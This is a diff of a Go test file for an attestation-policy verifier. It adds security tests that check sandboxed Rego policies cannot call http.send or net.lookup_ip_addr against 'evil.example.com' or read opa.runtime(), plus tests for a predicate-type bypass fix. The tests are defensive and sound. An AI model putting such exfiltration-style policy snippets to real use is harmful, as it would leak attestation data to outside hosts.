@@ -538,7 +538,8 @@ func TestCheckFunctionaries_WrongPredicateType(t *testing.T) {
 	}
 
 	result := s.checkFunctionaries([]source.CollectionVerificationResult{cvr}, nil)
-	// Even if predicate type is wrong, the "no verifiers" rejection also fires.
+	// Wrong predicate type causes immediate rejection without proceeding to
+	// functionary/verifier checks.
 	found := false
 	for _, r := range result.Rejected {
 		if r.Reason != nil && (assert.ObjectsAreEqual(r.Reason.Error(), "") == false) {
@@ -1218,4 +1219,172 @@ func TestDeepCopy_CertConstraint(t *testing.T) {
 func TestDeepCopy_NilCertConstraint(t *testing.T) {
 	var cc *CertConstraint
 	assert.Nil(t, cc.DeepCopy())
+}
+
+// ---------------------------------------------------------------------------
+// Security tests
+// ---------------------------------------------------------------------------
+
+// TestEvaluateRegoPolicy_BlocksHTTPSend verifies that Rego policies cannot use
+// http.send, which would allow data exfiltration from attestation data.
+func TestEvaluateRegoPolicy_BlocksHTTPSend(t *testing.T) {
+	policy := RegoPolicy{
+		Name: "exfiltrate.rego",
+		Module: []byte(`package exfiltrate
+deny[msg] {
+  resp := http.send({"method": "GET", "url": "http://evil.example.com"})
+  msg := "should never reach here"
+}`),
+	}
+	err := EvaluateRegoPolicy(&dummyAttestor{name: "dummy", typeStr: "test"}, []RegoPolicy{policy})
+	require.Error(t, err, "http.send must be blocked by restricted capabilities")
+}
+
+// TestEvaluateRegoPolicy_BlocksOPARuntime verifies that opa.runtime() is blocked.
+func TestEvaluateRegoPolicy_BlocksOPARuntime(t *testing.T) {
+	policy := RegoPolicy{
+		Name: "runtime.rego",
+		Module: []byte(`package runtime
+deny[msg] {
+  rt := opa.runtime()
+  msg := "should never reach here"
+}`),
+	}
+	err := EvaluateRegoPolicy(&dummyAttestor{name: "dummy", typeStr: "test"}, []RegoPolicy{policy})
+	require.Error(t, err, "opa.runtime must be blocked by restricted capabilities")
+}
+
+// TestEvaluateRegoPolicy_BlocksNetLookup verifies that net.lookup_ip_addr is blocked.
+func TestEvaluateRegoPolicy_BlocksNetLookup(t *testing.T) {
+	policy := RegoPolicy{
+		Name: "netlookup.rego",
+		Module: []byte(`package netlookup
+deny[msg] {
+  addrs := net.lookup_ip_addr("evil.example.com")
+  msg := "should never reach here"
+}`),
+	}
+	err := EvaluateRegoPolicy(&dummyAttestor{name: "dummy", typeStr: "test"}, []RegoPolicy{policy})
+	require.Error(t, err, "net.lookup_ip_addr must be blocked by restricted capabilities")
+}
+
+// TestEvaluateRegoPolicy_AllowsSafeBuiltins verifies that safe builtins like
+// string operations and comparisons still work after restricting capabilities.
+func TestEvaluateRegoPolicy_AllowsSafeBuiltins(t *testing.T) {
+	policy := RegoPolicy{
+		Name: "safe.rego",
+		Module: []byte(`package safe
+deny[msg] {
+  x := concat(", ", ["a", "b"])
+  x == "unexpected"
+  msg := "denied"
+}`),
+	}
+	err := EvaluateRegoPolicy(&dummyAttestor{name: "dummy", typeStr: "test"}, []RegoPolicy{policy})
+	assert.NoError(t, err, "safe builtins should still work")
+}
+
+// TestEvaluateRegoPolicy_NilAttestor verifies that a nil attestor is rejected
+// rather than causing a panic or producing a misleading "null" input.
+func TestEvaluateRegoPolicy_NilAttestor(t *testing.T) {
+	policy := RegoPolicy{
+		Name: "simple.rego",
+		Module: []byte(`package simple
+deny = []`),
+	}
+	err := EvaluateRegoPolicy(nil, []RegoPolicy{policy})
+	require.Error(t, err, "nil attestor must be rejected")
+	assert.Contains(t, err.Error(), "nil")
+}
+
+// TestCheckFunctionaries_WrongPredicateNotInPassed verifies that a collection
+// with the wrong predicate type is ONLY in Rejected, never in Passed.
+// This is the fix for the bypass where a wrong-predicate collection could end
+// up in both lists simultaneously.
+func TestCheckFunctionaries_WrongPredicateNotInPassed(t *testing.T) {
+	// Create a key so we have a real verifier
+	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+	require.NoError(t, err)
+	verifier := cryptoutil.NewECDSAVerifier(&priv.PublicKey, crypto.SHA256)
+	keyID, err := verifier.KeyID()
+	require.NoError(t, err)
+
+	s := Step{
+		Name: "build",
+		Functionaries: []Functionary{
+			{PublicKeyID: keyID},
+		},
+	}
+
+	// Wrong predicate type, but valid verifier that matches the functionary
+	cvr := source.CollectionVerificationResult{
+		CollectionEnvelope: source.CollectionEnvelope{
+			Statement: intoto.Statement{PredicateType: "https://wrong/type"},
+		},
+		Verifiers: []cryptoutil.Verifier{verifier},
+	}
+
+	result := s.checkFunctionaries([]source.CollectionVerificationResult{cvr}, nil)
+	assert.Empty(t, result.Passed, "wrong predicate type must never appear in Passed")
+	assert.NotEmpty(t, result.Rejected, "wrong predicate type must be in Rejected")
+}
+
+// TestCheckExtensions_InvalidGlobPattern verifies that an invalid glob pattern
+// in a cert constraint returns an error instead of panicking.
+func TestCheckExtensions_InvalidGlobPattern(t *testing.T) {
+	cc := CertConstraint{}
+	// Use reflection to test — we need a CertConstraint with an invalid glob
+	// in an Extensions field. The Extensions struct has string fields that get
+	// compiled as globs. We set one to an invalid pattern.
+	cc.Extensions.Issuer = "[invalid-glob"
+
+	// We need at least a minimal set of extensions to parse
+	err := cc.checkExtensions(nil)
+	// This should return an error (either from parsing or from the invalid glob)
+	// rather than panicking. Before the fix, glob.MustCompile would panic.
+	assert.Error(t, err, "invalid glob pattern should return error, not panic")
+}
+
+// TestValidateAttestations_MissingAttestationSkipsRegoEval verifies that when
+// an expected attestation is missing from a collection, the code correctly
+// skips Rego/AI evaluation rather than passing a nil attestor.
+func TestValidateAttestations_MissingAttestationSkipsRegoEval(t *testing.T) {
+	attType := "https://example.com/test/v1"
+	s := Step{
+		Name: "build",
+		Attestations: []Attestation{
+			{
+				Type: attType,
+				RegoPolicies: []RegoPolicy{
+					{
+						Name: "should-not-run.rego",
+						// This policy would error with nil input, proving the
+						// evaluator was never called.
+						Module: []byte(`package shouldnotrun
+deny[msg] {
+  input.name == "test"
+  msg := "denied"
+}`),
+					},
+				},
+			},
+		},
+	}
+
+	// Empty collection — no attestations present
+	cvr := source.CollectionVerificationResult{
+		CollectionEnvelope: source.CollectionEnvelope{
+			Statement: intoto.Statement{PredicateType: attestation.CollectionType},
+			Collection: attestation.Collection{
+				Name: "build",
+			},
+		},
+	}
+
+	result := s.validateAttestations([]source.CollectionVerificationResult{cvr}, "")
+	// The step should be rejected because the attestation is missing
+	assert.Empty(t, result.Passed, "missing attestation should not pass")
+	assert.NotEmpty(t, result.Rejected, "missing attestation should be rejected")
+	// The rejection reason should mention the missing attestation
+	assert.Contains(t, result.Rejected[0].Reason.Error(), "missing attestation")
 }
